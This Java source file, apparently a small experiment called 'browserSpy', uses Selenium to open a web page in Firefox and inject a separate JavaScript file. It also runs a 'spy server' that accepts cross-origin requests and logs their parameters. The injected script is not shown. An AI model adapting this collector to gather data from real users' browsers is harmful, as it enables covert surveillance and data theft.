package browserSpy;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.eclipse.jetty.server.Request;
import org.eclipse.jetty.server.Server;
import org.eclipse.jetty.server.handler.AbstractHandler;
import org.openqa.selenium.JavascriptExecutor;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.firefox.FirefoxDriver;

import com.google.common.base.Joiner;

public class App {

	public static void main(String[] args) throws Exception {
//		WebDriver driver = new ChromeDriver();
		WebDriver driver = new FirefoxDriver();
		driver.get("http://www.perdu.com");
		String payload = Joiner.on("\n").join(Files.readAllLines(new File(App.class.getResource("/payload.js").toURI()).toPath()));
		((JavascriptExecutor) driver).executeScript(payload);
		
		System.out.println("Starting spy server ...");
		Server server = new Server(8080);
	    server.setHandler(new AbstractHandler() {

			@Override
			public void handle(String target, Request baseRequest, HttpServletRequest request,
					HttpServletResponse response) throws IOException, ServletException {
				response.addHeader("Access-Control-Allow-Origin", "*");
		        response.setStatus(HttpServletResponse.SC_OK);
		        baseRequest.setHandled(true);
		        System.out.println(request.getParameterMap());
			}
	    	
	    });
        server.start();
        server.join();
	}
}
